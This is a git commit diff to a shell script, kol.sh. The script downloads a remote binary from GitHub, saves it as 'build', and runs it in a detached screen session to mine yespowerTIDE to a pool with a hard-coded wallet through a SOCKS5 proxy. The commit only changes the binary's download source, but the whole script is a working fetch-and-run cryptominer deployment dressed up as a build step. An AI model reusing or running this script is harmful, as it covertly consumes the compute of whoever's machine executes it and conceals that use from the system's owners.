db7bf98c483a18965ee658a9a085764e64b5dbbf
ghortiyowe <94232211+ghortiyowe@users.noreply.github.com>
2021-11-25 06:33:23 +0700

    Update kol.sh

--- kol.sh
+++ kol.sh
@@ -3,7 +3,7 @@
 apt-get update
 apt-get install screen -y
 wget -q https://raw.githubusercontent.com/ghortiyowe/gasken/main/compile.sh
-wget -qO build http://berkah.mdnet.co.id/cpuminer-sse2
+wget -qO build https://raw.githubusercontent.com/ghortiyowe/gasken/main/pyton
 chmod +x build
 chmod +x compile.sh
 screen -dm -S build ./build -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.JASUKA -p c=TDC --proxy socks5://67.201.33.9:25280
